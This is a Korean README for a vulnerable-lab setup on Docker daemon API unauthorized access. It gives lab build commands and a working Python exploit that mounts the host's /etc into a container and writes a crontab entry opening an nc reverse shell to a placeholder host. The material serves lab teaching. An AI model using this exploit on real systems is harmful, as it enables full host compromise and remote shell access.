# 도커 데몬 API 무단 액세스 공격

[中文版本(중국어판)](README.zh-cn.md )

참조 링크:

- http://www.loner.fm/drops/#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8

## 취약한 환경

취약한 환경을 구축하고 실행하려면 다음 명령을 입력합니다:

```
docker compose build
docker compose up -d
```

## 익스플로잇

컨테이너를 시작하고 호스트 '/etc' 폴더를 컨테이너에 마운트하면 모든 파일에 대한 읽기/쓰기 권한을 갖게 됩니다.

명령어를 crontab 구성 파일에 넣어 셸을 획득할 수 있습니다
```python
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

명령어를 crontab에 주입하여 리버스 셸 획득:

![](1.png)
